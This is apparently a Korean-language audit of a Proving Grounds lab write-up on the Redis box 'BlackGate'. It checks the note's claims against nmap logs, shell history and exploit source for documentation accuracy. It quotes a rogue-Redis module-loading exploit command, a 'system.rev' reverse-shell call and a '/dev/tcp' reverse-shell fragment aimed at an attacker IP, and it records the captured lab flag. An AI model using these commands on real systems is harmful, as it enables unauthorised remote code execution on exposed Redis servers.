---
type: audit
target: "03. PG/BlackGate.md"
date: 2026-09-09
manual_tags: true
manual_status: true
status: 감사완료
---

# BlackGate — 적대적 검증 감사

원본 148행(`_backup\BlackGate.md.bak`) → 개작본 303행. 증가분 155행의 실측 여부가 감사 초점.

## 1. 결론

**증가분 155행은 대부분 실측으로 확인.** 제기한 지적 13건 중 **9건이 자기반증으로 철회**되고 4건만 정정으로 남음. 날조 **0건**.

가장 컸던 의심 — 「권한상승 절에 재현 단계를 지어 넣었는가」 — 는 반대였음. 해당 절은 `미완`·「관측 없음」·「근거부족」·`미판정` 으로 정직하게 비어 있고 `Steps to reproduce the attack:` 2번이 「이후 단계 **미완**」. 지어낸 흔적 부재.

## 2. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `— 출처: ~/PG/BlackGate/nmap.log` (nmap 펜스 하단) | 펜스 첫 줄 `Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-28 13:44 +0900` 과 끝 줄 `Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds` 는 **nmap.log 에 존재하지 않음.** 로그 파일은 `-oN` 형식이라 `# Nmap 7.98 scan initiated Fri Aug 28 13:44:23 2026 as: ...` / `# Nmap done at Fri Aug 28 13:44:50 2026 -- ...` 임. 펜스는 대화형 터미널 stdout 캡처이고 출처 표기가 파일을 가리켜 A-1 provenance 어긋남 | 「대화형 터미널 캡처. 같은 스캔의 파일 기록은 `~/PG/BlackGate/nmap.log` — `-oN` 형식이라 헤더·푸터 줄만 `#` 주석 형태로 다름」 |
| `*그림 1 — 모듈 적재부터 system.exec id 응답까지의 한 화면*` | 스크린샷 실물을 열어 대조한 결과 범위가 어긋남. 실제 화면은 **명령 투입 줄(`python redis-master.py ...`)부터 `MODULE UNLOAD` +OK 까지** 위 코드블록 전체를 담음 | 「명령 투입부터 `MODULE UNLOAD` 응답까지 위 블록 전체가 담긴 한 화면」 |
| `[[Zipper]] · [[Crane]] — bash -c '...' 로 감싸지 않아 …` | 함정(`/bin/sh`=dash)은 같으나 **Crane 의 우회 수단이 다름.** `Crane.md:296` — 「base64 로 한 겹 감싼 것임. 최종 파이프는 반드시 `\| bash`」. `bash -c` 래핑은 Zipper(`Zipper.md:179`)만 | 함정과 우회 수단을 갈라 서술. Zipper=`bash -c` 래핑 / Crane=base64 + `\| bash` |
| `익스플로잇은 vulhub/redis-rogue-getshell 을 사용.` | 경로를 꺾은 시도 하나가 통째로 누락. `Ridter/redis-rce` 를 먼저 붙였다가 셸 미확보로 교체한 사실이 산출물·히스토리에 남아 있는데 본문에는 「관련」 목록의 경로 한 줄뿐 | 한 줄 추가 — 「먼저 붙은 `Ridter/redis-rce`(08-28 clone)로는 셸 미확보. 3일 뒤 `vulhub/redis-rogue-getshell`(08-31 clone)로 교체한 것이 통했고, 이후 이 절의 모든 명령은 그쪽 `redis-master.py`」<br>근거 — `redis-rce/` 파일 mtime 전량 `2026-08-28 16:01:38`, `redis-rogue-getshell/` 전량 `2026-08-31 10:21:40`. `~/.zsh_history` 에 `git clone …/redis-rce.git` → 실패 호출 6회 + `vi redis-rce.py` 2회 → `git clone …/redis-rogue-getshell.git` 순서 잔존 |

## 3. 삭제한 것

**없음.** 반증된 서술 부재라 강등·삭제 모두 미발생.

## 4. 반증한 것 — 지적으로 올랐다가 노트가 옳았던 것

작성자 자기보고 4건 중 **3건 확인, 1건 반증.**

### 4-1. `exp.c` 미커밋 패치 2줄 — **작성자 옳음**

노트의 ```diff 블록은 `git diff` 출력과 **바이트 일치.** index 해시 `cfeb95e..52e437c` 까지 동일.

```
$ cd ~/PG/BlackGate/redis-rogue-getshell && git log --oneline -n 1
f89fc78 Merge pull request #3 from vulhub/ISSUE-2
$ git status --porcelain
 M RedisModulesSDK/exp/exp.c
?? RedisModulesSDK/exp/exp.c.orig
```

노트가 적은 upstream 기준 커밋 `f89fc78` 이 실제 HEAD. `exp.c.orig` 실재.
**오늘 만들어진 것이 아님** — `stat` 의 mtime·ctime 이 둘 다 `2026-08-31 10:29:06`(exp.c.orig `.258609622`, exp.c `.261467810`, exp.o `.322`, exp.so `.358`). 풀이 당일 100ms 안에 일어난 한 동작.

### 4-2. 「원본은 현행 gcc 에서 컴파일 실패」 — **작성자 옳음. 재현 성공**

산출물을 건드리지 않으려 `/tmp/bgaudit/` 사본으로 재현. `exp.c.orig` 를 `exp.c` 로 되돌리고 `make`:

```text
exp.c:23:29: error: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
exp.c:27:25: error: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
exp.c:48:38: error: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
```

노트의 세 줄과 **행:열까지 완전 일치.** `gcc --version` → `gcc (Debian 15.3.0-1) 15.3.0` 로 캡션의 버전 문자열도 일치. 캡션의 「`error` 줄만 발췌(경고 다수 동반)」도 사실 — 전체 출력에서 `error` 는 정확히 이 셋.

### 4-3. `tech/lin/container-escape` 오탐 — **작성자 옳음**

`_INDEX\_tools\extract.py:96`:

```python
("tech/lin/container-escape", [r"docker\s+group", r"\blxd\b", r"lxc\s+init", r"docker\.sock"]),
```

노트 본문의 `/tmp` 목록에 `snap.lxd` 가 있고, Python `re` 에서 `.` 는 비단어 문자라 `snap.lxd` 의 `lxd` 앞뒤가 워드 경계로 성립 → `\blxd\b` 매칭. 자동 태거가 붙일 수밖에 없는 구조. `manual_tags: true` 선언과 태그 제거 **정당**.

`manual_status: true` 도 파서가 실제로 지원하는 필드(`extract.py:184` `MANUAL_STATUS_RE`, `:472-475`). `DECL_STATUS_RE = ^status:\s*(\S+)\s*$` 에 `status: partial` 매칭 확인.

### 4-4. `~/.zsh_history` 3167~3292행 시행착오 보존 — **작성자 옳음**

지목된 3건 전부 실재(파일 총 3292행, BlackGate 구간이 끝단).

| 노트 서술 | 히스토리 원문 |
|---|---|
| EDB 44904 헛다리 | `searchsploit redis 4.0` → `searchsploit -m 44904` → `python 44904.py` → `python2 44904.py` → `vi 44904.py` → `rm 44904.py` |
| `-P` 포트 충돌 | `-P 4443` · `-P 443` · `-P 4444`(콜백도 4444) · `-P 8888` 로 옮겨 다닌 흔적. 별도로 `redis-cli -h 192.168.141.176 system.rev 192.168.45.223 4444` 도 시도 |
| popen→dash 함정 | 맨 `bash -i >& /dev/tcp/…` 로 **4회 실패** 후 `-c "bash -c 'bash -i >& …'"` 로 성공. 두 형태가 히스토리에 나란히 잔존 |

### 4-5. 「`redis-rce/` 는 `git status --porcelain` clean」 — **반증. 작성자 오류**

```
$ cd ~/PG/BlackGate/redis-rce && git status --porcelain
?? exp.so
```

clean 아님. `exp.so`(48000B, mtime `2026-08-31 15:19:47`)가 untracked 로 존재 — 히스토리의 `cp exp.so ../../redis-rce` 산물. **노트 본문에는 이 주장이 없으므로 본문 정정 불필요.** 작성자 보고서에만 있던 오류.

### 4-6. Kali 프롬프트 신규 창작 의심 — **반증. 전부 실측**

원본 148행에 `┌──(kali㉿kali)` 프롬프트가 4개(21·57·86·107행), 개작본에도 4개(61·141·173·197행). **개작 과정에서 추가된 프롬프트 0개.**

결정적 증거 — 스크린샷 `파일보관\d328a8b036f408dd082ce86ea9a0df35_MD5.jpg` 를 직접 열어 보니 화면 최상단이 `┌──(kali㉿kali)-[~/PG/BlackGate/redis-rogue-getshell]` / `└─$ python redis-master.py -r 192.168.141.176 -p 6379 -L 192.168.45.223 -P 4444 -f RedisModulesSDK/exp.so -c "id"` 이고 그 아래 출력이 노트 코드블록과 한 글자도 다르지 않음. **대화형 터미널 캡처가 화면으로 증명됨.** 타겟 pty 프롬프트(`prudence@blackgate:~$`)도 전량 보존 확인.

### 4-7. 「로그 헤더 13:44:23 → 푸터 13:44:50」 — **작성자 옳음**

`nmap.log` mtime(`13:44:50.128`)에서 26.44초를 역산해 지어낸 값으로 의심했으나 **로그 안에 실재.**

```
1행:  # Nmap 7.98 scan initiated Fri Aug 28 13:44:23 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.141.176
27행: # Nmap done at Fri Aug 28 13:44:50 2026 -- 1 IP address (1 host up) scanned in 26.44 seconds
```

`nnmap` 별칭 옵션 문자열도 로그의 `as:` 줄과 일치.

### 4-8. 단정형 일반 지식 3건 — **전부 소스 대조로 확인**

| 노트 서술 | 원본 |
|---|---|
| 「`-P` 는 rogue master 리슨 포트(기본값 21000)이지 콜백 포트가 아님」 | `redis-master.py:126-127` — `"-P","--lport" … help="rogue server listen port, default 21000", default=21000` |
| 「`system.exec` 은 모듈 안에서 `popen(cmd, "r")` 로 실행」 | `exp.c.orig:18` — `FILE *fp = popen(cmd, "r");` |
| 「모듈 `exp.so` — `system.exec`·`system.rev` 등록」 | `exp.c.orig:68`·`:71` — `RedisModule_CreateCommand(ctx, "system.exec"…)` · `(ctx, "system.rev"…)` |

EDB 44904 제목도 실행 확인 — `searchsploit redis 4.0` 이 내놓는 유일한 후보가 `Redis-cli < 5.0 - Buffer Overflow (PoC) | linux/local/44904.py`.

### 4-9. `[[Wombo]]` 대조 서술 — **작성자 옳음**

`Wombo.md:41` — 「redis-server 가 **uid 0 으로 구동**되어 `popen` 자식이 uid 0 을 상속 → 무인증 원격 RCE 가 곧 root」. 노트의 대조 서술과 일치.

### 4-10. 감사 지시 자체의 오류 — 산출물 목록

지시는 「`~/PG/BlackGate/` 뿐이다: `nmap.log`(1319B) · `redis-rogue-getshell/` · `redis-rce/`」로 적었으나, 그 하위에 감사의 핵심 근거가 다수 존재 — `RedisModulesSDK/exp/exp.c.orig`(2108B) · `exp.c`(2151B) · `exp.o` · `exp.so` 2벌 · `Makefile` · `1.png`(172198B). **「산출물이 얇다」는 전제가 사실과 달랐고, 그 전제로 갔으면 4-1·4-2 를 근거부족으로 잘못 강등했을 것.**

## 5. 정정하지 않고 남긴 것

- **A-7 소스 고고학 판정** — ```diff 패치 블록과 gcc error 블록은 A-7 의 「패치 diff 는 재현에 필요할 때만」에 걸릴 수 있으나, **두 줄을 안 넣으면 빌드 자체가 안 되므로 재현 필수 경로.** 존치.
- **`tech/lin/sudo-abuse` 제거** — `extract.py:92` 의 `sudo\s+-l`·`NOPASSWD` 에 자동 매칭되나 권한상승이 미완이라 실제로 「사용한 기법」 부재. 작성자 판정 지지.
- **첫 `-c "id"` 실행이 `-P 4444`(콜백과 동번호)인데 성공한 점** — 그 시점에 `nc` 리스너가 없어 충돌이 나지 않은 것이고, 노트는 「4444 가 실패했다」고 적지 않음. 모순 부재.

## 6. 총괄 판단 필요

1. **`_STATUS.md:305` 가 `- [ ] BlackGate \`0/2\`` (Advanced 미착수 구간).** 실측은 `local.txt` = `c68b27d911143e2a9d167fc47cc3a56d` 를 `prudence@blackgate:~$ cat local.txt` 로 원위치 취득 → **부분 1/2.** `pg-line-manager` 반영 필요(직접 편집 안 함).
2. **`_PLAYBOOK.md` 에 `BlackGate` 언급 0건.** 노트는 「시행착오·교훈 → [[_PLAYBOOK]]」·「[[_PLAYBOOK]] `B-25` 참조」로 넘기는데 `B-25`(무인증 Redis)·`A-31`(리버스셸 미착) 어느 쪽에도 이 박스 사례가 없음. 이관 미완 — append 필요.
3. **문체 A-4 위반 8건 → `pg-doc-reviewer` 이관.** 명사형 어미 잔존 위치 — 96행 `좁혀짐` · 136행 `나타남` · 138행 `답함` · 168행 `아님` · 192행 `아님`/`않음` · 194행 `읽음` · 300행 `끝남`. 사실관계 영향 없음.
4. **`pg-machine.template.md` 프론트매터와 볼트 색인 스키마의 분기.** 템플릿은 `tier`·`machine`·`method`·`started`·`user_at`·`root_at`·`stuck_total`·`session_logged`·`tricks_logged`·`ledger`·`date` 를 요구하고 `platform: proving-grounds`·`status/rooted` 를 쓰는데, 볼트는 `platform: pg`·`status/partial` 체계. **283개 노트 전체에 걸린 사안이라 단독 판단 밖.** 이 감사에서는 볼트 체계 유지.
5. **색인 갱신 필요** — 프론트매터 `status`·`tags` 변경분 미반영. `refresh.ps1` 은 공유 인프라라 실행하지 않음.

## 7. 근거 출처

- Kali 산출물 — `~/PG/BlackGate/nmap.log` · `~/PG/BlackGate/redis-rogue-getshell/`(`.git` · `redis-master.py` · `RedisModulesSDK/exp/{exp.c, exp.c.orig, Makefile}`) · `~/PG/BlackGate/redis-rce/`
- `~/.zsh_history` 3167~3292행
- 볼트 — `03. PG\_backup\BlackGate.md.bak`(원본 148행) · `파일보관\d328a8b036f408dd082ce86ea9a0df35_MD5.jpg`(직접 열람) · `_INDEX\_tools\extract.py` · `03. PG\{Wombo,Zipper,Crane,_PLAYBOOK,_STATUS}.md`
- 규격 — `F:\project\DOC_TEMPLATE\REFERENCE.md` · `templates\report-base\report.base.md`(A-1~A-7) · `templates\pg-machine-md\pg-machine.template.md`
- 직접 실행한 명령
  - `git log --oneline` · `git status --porcelain` · `git diff` (두 저장소)
  - `diff -u exp.c.orig exp.c`
  - `cp -r RedisModulesSDK /tmp/bgaudit/ && cp exp.c.orig exp.c && make` — 컴파일 실패 재현
  - `gcc --version` · `searchsploit redis 4.0`
  - `stat -c '%n mtime=%y ctime=%z'` — exp.c · exp.c.orig · exp.so · nmap.log
  - `cat -A nmap.log | head -5` — 로그 헤더 원문 확인
- 파일시스템 광역 탐색 **미실시**(`find /`·홈 grep·`~/PG` 전수 스캔). 고정 출처 목록 안에서만 확인.

---

## A-2-1 이관 — 본문에서 내린 추정 (2026-09-09)

규격 7차 개정으로 `[가정]`·「근거부족」이 본문 금지 토큰으로 전환(A-2 표 · A-2-1). 「관측 없음」·「미계측」·「해당 없음」·「원문 미보존」은 유지 토큰이라 본문에 그대로 존치.

이관 대상은 `03. PG\BlackGate.md` 3건. 행번호는 편집 전 304행 판본 기준.

### 이관 1 — 244행 `Privilege Escalation` / `Vulnerability Explanation:`

원문 그대로:

```text
- 미확정된 부분 — 해당 파일의 종류·내용·호출 대상 **관측 없음**. 어떤 결함으로 root 셸에 닿는지는 **근거부족**
```

- **내린 것** — 「어떤 결함으로 root 셸에 닿는지는 **근거부족**」 한 문장
- **본문에 남긴 것** — 「미확정된 부분 — 해당 파일의 종류·내용·호출 대상 **관측 없음**」. 「관측 없음」은 대상 사실 표시라 유지 토큰
- **함께 내린 결론** — 없음. 「근거부족」 문장이 지지하던 하위 결론 부재
- **판정 근거** — `/usr/local/bin/redis-status` 의 `file`·`cat`·`strings` 결과가 산출물에 부재하고 대상 인스턴스 정지로 수집 불가. 「어떤 결함인가」는 작성자 추론의 공백 선언이라 A-2 의 「봤으나 판정에 모자람」에 해당

### 이관 2 — 248행 `Privilege Escalation` / `Vulnerability Fix:`

원문 그대로:

```text
- `[가정]` 래퍼를 유지해야 한다면 내부 호출을 절대 경로로 고정하고 `secure_path` 밖의 인자 전달을 차단. 파일 내용을 확인하지 않은 상태의 일반 조치
```

- **내린 것** — `[가정]` 표시 · 「파일 내용을 확인하지 않은 상태의 일반 조치」
- **본문에 남긴 것** — 「래퍼를 존치할 경우 내부 호출을 절대 경로로 고정하고 `secure_path` 밖의 인자 전달을 차단할 것」
- **함께 내린 결론** — 없음. 조치 권고 자체는 `redis-status` 의 내용과 무관하게 성립하므로 추정을 걷어내도 존치 가능
- **판정 근거** — 「파일 내용을 확인하지 않은 상태」는 **작성자 자신의 행위 서술**이라 A-2-1 의 「자기 행위에 인식론 표기를 붙이지 말 것」에 직접 저촉. 같은 사실은 이관 1 이 남긴 「종류·내용·호출 대상 **관측 없음**」이 이미 대상 서술로 표현
- **문체** — 권고이므로 A-4 의 「강한 지시 = `~할 것`」 형태로 종결 교체

### 이관 3 — 269행 `Privilege Escalation` 말미

원문 그대로:

```text
`/tmp` 목록의 `snap.lxd` 는 snapd 가 만드는 디렉터리이고, `prudence` 의 `lxd` 그룹 소속 여부는 **관측 없음**. 컨테이너 탈출 경로의 성립 여부는 **근거부족**.
```

- **내린 것** — 「컨테이너 탈출 경로의 성립 여부는 **근거부족**」 한 문장
- **본문에 남긴 것** — 앞 문장 전체(`snap.lxd` 의 출처와 `lxd` 그룹 소속 여부 **관측 없음**)
- **함께 내린 결론** — 없음. 앞 문장은 `/tmp` 목록이라는 실측에 직접 얹혀 있어 뒤 문장과 독립
- **판정 근거** — `id` 출력이 `groups=1001(prudence)` 단독이라 `lxd` 그룹 부재 쪽 증거가 이미 존재하나, 그것을 근거로 「탈출 경로 불성립」을 단정하려면 그룹 외 경로(소켓 권한·`lxc` 바이너리 SUID 등) 배제가 필요. 그 확인이 미실시라 결론 자체를 본문에서 제거

### 「확인 불가」와 「확인 안 함」의 구분

이관 3건 모두 **확인 불가** 쪽. 근거 — 대상 인스턴스 정지로 재수집 경로 부재. Kali `10.44.44.128` 도 이번 작업 시점에 ping·SSH 모두 timeout 이라 `~/PG/BlackGate/` 산출물 대조 자체가 **불가**. 따라서 `<!-- 확인 필요: … -->` 주석 대상 아님.

### 함께 처리한 문체 정정

| 규약 | 위치(편집 전) | 조치 |
|---|---|---|
| A-4 명사형 어미 | 97행 「벡터가 6379 단독으로 좁혀짐」 | 「벡터는 6379 단독으로 축소」 — 파생명사 단독 종결 |
| A-4L 산문 200자 초과 | 111행 (271자) | 저장소 교체 · 명령 출처 · 현장 빌드 3개 불릿으로 분할. 볼드 줄머리 부여. 빌드 실패 사실은 별 문단으로 분리 |
| A-4L 산문 200자 초과 | 238행 (244자) | 「채점 3요건 중 둘 충족」 선언 후 플래그 내용·타깃 IP·재촬영 3개 불릿으로 분할 |

코드펜스 내부 · 타깃 pty 프롬프트(`prudence@blackgate:~$`) · nmap raw 포트 줄 · 유지 토큰 4종은 미변경.

---

## 적대적 재검증 — 규격 정정분 2차 감사 (2026-09-09)

대상은 A-2·A-2-1·A-4·A-4L·A-5 적용분. 대조 축은 `_backup\BlackGate.md.pre-a2-20260909.bak`(304행) ↔ 정정 전 312행 ↔ 정정 후 314행.

### R-0. 검증 조건

- Kali `10.44.44.128` — ping·SSH 모두 timeout. `~/PG/BlackGate/` 산출물 재대조 **불가**
- 따라서 산출물 의존 항목은 전부 **미검증(대조 불가)**. 부재를 근거로 한 날조 판정 미실시
- 파일시스템 광역 탐색 미실시. 확인 범위는 볼트 내부 · 규격 정본 · 검사기 실행

### R-1. 고친 것 (3건)

#### R-1-1. `Initial Access` / `Vulnerability Fix` — `rename-command` 단독 차단 주장

삭제한 원문:

```text
- `rename-command` 로 `CONFIG`·`MODULE`·`SLAVEOF` 중 **하나만** 비워도 연쇄 단절. 애플리케이션이 `CONFIG` 를 쓰지 않는다면 이쪽이 저비용
```

- **무엇이 틀렸나** — `CONFIG` 단독 rename 은 연쇄를 못 끊음. `dbfilename` 변경만 막힐 뿐 복제 수신 바이트는 기본 경로에 그대로 기록
- **`MODULE LOAD` 의 인자는 이름이 아니라 경로** — 파일명이 `dump.rdb` 로 남아도 그 경로를 그대로 지정 가능
- **폐해** — 노트가 셋 중 가장 약한 조치를 「저비용」 우선안으로 권고. 그대로 적용하면 경로 잔존
- **어떻게 고쳤나** — 41·42행. `MODULE`·`SLAVEOF` 를 실효 조치로 갈라 적고 `CONFIG` 단독은 부족으로 명시. 5.0 이상 `REPLICAOF` 별칭 조항 추가
- **근거 등급** — Redis 인스턴스 부재라 **실행 대조 불가**. 판정 근거 셋은 전부 노트 본문이 이미 서술한 사실(복제 쓰기 · `dlopen` 적재 · 구동 계정 상속)

#### R-1-2. `Privilege Escalation` / `Vulnerability Fix` — `secure_path` 오용

삭제한 원문:

```text
- 래퍼를 존치할 경우 내부 호출을 절대 경로로 고정하고 `secure_path` 밖의 인자 전달을 차단할 것
```

- **무엇이 틀렸나** — sudoers `secure_path` 는 sudo 로 실행되는 명령의 PATH 를 덮어쓰는 항목. 인자 전달과 무관해 「`secure_path` 밖의 인자」라는 표현 자체가 불성립
- **어떻게 고쳤나** — 257·258행. 절대 경로 고정과 인자 셸 해석 금지를 두 줄로 분리하고 `secure_path` 의 실제 적용 범위를 명시
- **근거 등급** — sudoers 문서 기준. Kali 접속 불가로 `sudo -V`·`man sudoers` 실행 대조 **미실시**

#### R-1-3. `Privilege Escalation` 말미 — 「관측 없음」이 이미 관측된 대상을 가리킴

삭제한 원문:

```text
`/tmp` 목록의 `snap.lxd` 는 snapd 가 만드는 디렉터리이고, `prudence` 의 `lxd` 그룹 소속 여부는 **관측 없음**.
```

- **무엇이 틀렸나** — 노트 자체 코드펜스에 `uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)` 존재
- 즉 보조그룹에 `lxd` 가 없다는 것이 **이미 관측된 사실**인데 본문은 그 자리를 「관측 없음」으로 선언 — 노트가 자기 증거에 반박당하는 형태
- **어떻게 고쳤나** — 279행. 관측된 사실(보조그룹 부재)을 적고, 「관측 없음」 토큰은 실제로 안 본 `/etc/group` 원문으로 재지정
- **유지 토큰 총수 불변** — 「관측 없음」 4 · 「원문 미보존」 1 · 「해당 없음」 3 (정정 전후 동일)
- 이 항목은 1차 개작 산물 아님 — **백업본에도 동일 문장 존재**

### R-2. 되반증한 것 — 지적으로 올랐다가 노트·작성자가 옳았던 것

지시받은 재검증 6건 중 4건 지지 · 1건 부분 반증 · 1건 자기 지적 철회.

**R-2-1. 원본 244행 「관측 없음」의 대상 이동 여부 — 이동 부재. 작성자 옳음**
- 정정 전후 대상 문자열 동일 — 「해당 파일의 종류·내용·호출 대상」
- 함께 내려야 할 결론도 부재. 같은 finding 의 `Severity: 미판정 — 악용 미완` · `Steps: 2. 이후 단계 미완` 이 이미 미완을 선언

**R-2-2. 원본 248행 — 「무엇을 확인하지 못했는지」 소실 우려. 작성자 옳음**
- 같은 finding 의 `Vulnerability Explanation` 이 「해당 파일의 종류·내용·호출 대상 **관측 없음**」으로 조치의 적용 범위를 이미 한정
- 「파일 내용을 확인하지 않은 상태」는 작성자 자기 행위 서술이라 A-2-1 직접 저촉. 대상 서술로 옮긴 판단이 정확
- 심사관 오해 가능성 불성립. 다만 남은 권고문 자체에 별개의 기술 오류 존재 → R-1-2

**R-2-3. 원본 269행 「결론 통째 제거」 — 제거는 옳으나 잔여가 부족. 부분 반증**
- 「컨테이너 탈출 경로 성립 여부 근거부족」 제거는 지지. 소켓 권한·`lxc` SUID 배제가 미실시라 결론을 받칠 근거 부재
- 그러나 남은 문장이 노트가 이미 쥔 양성 증거(`groups=` 단독)를 버린 상태 → R-1-3 으로 보강
- 판정 — 「lxd 경로는 검토 대상」이라는 유보를 되살릴 것이 아니라, **관측된 음성 증거를 적는 쪽이 맞음**

**R-2-4. A-4L 분할이 새 사실을 만들었는가 — 미생성**

| 백업 행 | 분할 후 | 사실 증감 |
|---|---|---|
| 111행(271자) | 3불릿 + 별문단 | 부재. 「교체한 것이 통했고」→「교체 후 성공」 어휘 교체뿐 |
| 238행(244자) | 선언 + 3불릿 | 부재. 「플래그 값과」가 추가됐으나 같은 펜스에 `cat local.txt` 출력이 공존해 실측 범위 안 |

**R-2-5. A-4 97행 「좁혀짐」→「축소」 — 뜻 유지**
- 「벡터는 6379 단독으로 축소」. 앞 문장의 「해당 없음」 판정과 이어져 어색함 부재

**R-2-6. 중복 `### Initial Access` 제목 — 자기 지적 철회**
- 구조 결손 후보로 올렸다가 반증. `Wombo`·`Zipper`·`Crane`·`Nagoya`·`Fikklish` 전부 2개로 동일 관례
- 4항목(`Vulnerability Explanation`·`Fix`·`Severity`·`Steps`)은 앞 절이 보유. `Port Scan Results` 표와 nmap raw 포트 줄(22/tcp·6379/tcp)도 잔존

**R-2-7. `[[_PLAYBOOK]]` 앵커 유효**
- `B-25`(무인증 Redis = 임의 파일 쓰기 = RCE) · `A-31`(리버스셸이 안 붙는다) 둘 다 실재. 링크 파손 부재

**R-2-8. 프롬프트 — 양방향 검사 통과**
- 타겟 pty 프롬프트 `prudence@blackgate` 8개 전량 잔존. 제거 사고 부재
- Kali 프롬프트 4개도 정정 전후 동수. 레거시 대화형 세션분이라 미변경

### R-3. 미검증 — 대조 불가

- `~/PG/BlackGate/` 산출물 전량. Kali 접속 불가
- `파일보관\d328a8b036f408dd082ce86ea9a0df35_MD5.jpg` 재열람 미실시. 1차 감사의 대조 결과를 승계
- Redis 4.0.14 에서 `CONFIG` 단독 rename 시의 실거동(R-1-1)
- `REPLICAOF` 별칭의 5.0 도입 시점 — 벤더 릴리스 노트 기준. 실행 대조 미실시

### R-4. 총괄 판단 필요 — 다른 문서 파급

- **`_PLAYBOOK.md` B-25 에 동일 오류.** 「방어(`rename-command`) — `CONFIG` · `MODULE` · `SLAVEOF` 셋 중 하나만 지워도 이 경로 전체가 닫힘」
- 박스 노트만 고치면 두 문서가 어긋남. `_PLAYBOOK` 은 공유 자산이라 단독 편집 미실시
- **`_PLAYBOOK` 이관 미완**(1차 감사 6-2 와 동일) — B-25·A-31 어느 쪽에도 BlackGate 사례 부재
- **문체 이관 1건** → `pg-doc-reviewer`. 요약 콜아웃 23행과 26행이 「`proof.txt` 미확보 — 근거는 `Post-Exploitation`」을 중복 서술(A-4 「한 정보를 두 번 쓰지 마라」). 검사기 A-4 계열은 0건

### R-5. 판정

- **플래그 — 부분 1/2.** `local.txt` = `c68b27d911143e2a9d167fc47cc3a56d`
- **취득 방식 — 대화형 리버스셸.** `bash -i` 세션에서 `cd` 후 `cat local.txt`. 웹셸 아님 → 시험 채점 요건 충족
- 근거 — 같은 펜스에 `rlwrap nc -lnvp 4444` 수신 배너 · `connect to [192.168.45.223] from (UNKNOWN) [192.168.141.176] 53428` · 타겟 pty 프롬프트 · 비 pty 셸의 명령 에코가 공존
- `proof.txt` 미확보. root 미도달
- `_STATUS.md` 미편집. 기록은 `pg-line-manager` 단독 소관

### R-6. 근거 출처

- 볼트 — `03. PG\BlackGate.md` · `_backup\BlackGate.md.pre-a2-20260909.bak` · `_PLAYBOOK.md`(B-25 · A-31) · `Wombo.md`·`Zipper.md`·`Crane.md`·`Nagoya.md`·`Fikklish.md`(제목 관례 대조)
- 규격 — `F:\project\DOC_TEMPLATE\templates\report-base\report.base.md` A-1·A-2·A-2-1·A-4·A-4L·A-5·A-7
- 직접 실행 — `style-check.ps1` 재실행 → `BlackGate.md` **0건**. 유지 토큰 재계수 → 4·1·3 불변
- Kali 산출물 · `~/.zsh_history` · `파일보관\` 재대조 **미실시**(접속 불가)
